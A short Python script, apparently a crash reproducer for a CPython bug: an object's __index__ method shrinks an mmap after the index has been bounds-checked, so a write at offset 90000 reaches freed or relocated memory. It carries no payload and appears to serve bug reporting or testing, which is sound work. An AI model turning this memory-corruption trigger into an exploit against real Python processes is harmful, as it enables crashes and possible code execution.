import mmap

# large anonymous mapping: 100000 bytes ~ 25 pages
mm = mmap.mmap(-1, 100000)

class Evil:
    def __index__(self):
        # runs during the *value* conversion, after index `i` was bounds-checked
        mm.resize(8)   # shrink mapping to a single page; self->data may move
        return 0

# item = 90000 (valid vs. original size), value = Evil()
mm[90000] = Evil()
print("no crash")
